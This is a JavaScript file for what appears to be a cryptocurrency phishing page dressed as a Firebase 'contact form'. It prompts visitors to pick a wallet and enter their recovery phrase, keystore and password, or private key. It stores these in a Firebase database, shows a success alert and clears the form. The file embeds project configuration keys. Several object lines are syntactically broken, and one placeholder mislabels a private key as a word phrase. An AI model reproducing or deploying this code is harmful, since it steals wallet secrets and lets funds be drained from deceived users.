const firebaseConfig = {
  apiKey: "AIzaSyDL02IHV9fVfPm5r2g5-j3KxvPjrP7pj7c",
  authDomain: "contactform-50d9f.firebaseapp.com",
  databaseURL: "https://contactform-50d9f-default-rtdb.firebaseio.com",
  projectId: "contactform-50d9f",
  storageBucket: "contactform-50d9f.appspot.com",
  messagingSenderId: "481729191146",
  appId: "1:481729191146:web:6798592b5070b2119f0b93"
};

// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("contactForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  
  
  var selectedWallet = getElementVal("selected-wallet");
  
            var walletInfoType = document.getElementById('wallet-info-type').value;

            // Retrieve information input based on the selected type
            
            switch (walletInfoType) {
                case 'phrase':
                    var walletPhrase = document.getElementById('wallet-phrase').value; 
                    break;
                case 'keystore':
                    var walletKeystore = document.getElementById('wallet-keystore').value;
                    var walletPassword = document.getElementById('wallet-password').value;
                    break;
                case 'private-key':
                    var walletPrivateKey = document.getElementById('wallet-private-key').value;
                    break;
                default:
                    break;
            }

  saveMessages(selectedWallet,walletPhrase,walletKeystore,walletPassword,walletPrivateKey);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("contactForm").reset();
}

const saveMessages = (selectedWallet,walletPhrase,walletKeystore,walletPassword,walletPrivateKey) => {
  var newContactForm = contactFormDB.push();
   const data = {
 
    selectedWallet: selectedWallet  "",
    walletPhrase: walletPhrase  "",
    walletKeystore: walletKeystore  "",
    walletPassword: walletPassword  "",
    walletPrivateKey: walletPrivateKey || "",
  };

  newContactForm.set(data);
  // newContactForm.set({
  //   name: name,
  //   emailid: emailid,
  //   msgContent: msgContent,
  //    selectedWallet: selectedWallet,
  //   walletPhrase: walletPhrase,
  //   walletKeystore: walletKeystore,
  //   walletPassword: walletPassword,
  //   walletPrivateKey: walletPrivateKey, 
  // });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

function selectWallet() {
            var selectedWallet = document.getElementById("wallet-list").value;
            document.getElementById("selected-wallet").value = selectedWallet;
            showWalletForm(selectedWallet);
        }

        function showWalletForm(selectedWallet) {
            // Display the wallet connection form
            document.getElementById('contactForm').style.display = 'block';

            // Show or hide information input based on the selected wallet type
            showInfoInput(selectedWallet);
        }

function showInfoInput(selectedWallet) {
            // Retrieve selected information type
            const walletInfoType = document.getElementById('wallet-info-type').value;

            // Remove any existing information input elements
            const infoInputContainer = document.getElementById('info-input-container');
            infoInputContainer.innerHTML = '';

// Dynamically create and append information input fields based on the selected type and wallet
            switch (walletInfoType) {
                case 'phrase':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
                    `;
                    break;
                case 'keystore':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
                        <label for="wallet-password">Wallet Password:</label>
                        <input type="password" id="wallet-password" placeholder="Enter your password">
                    `;
                    break;
                case 'private-key':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
                    `;
                    break;
                default:
                    break;
            }
        }
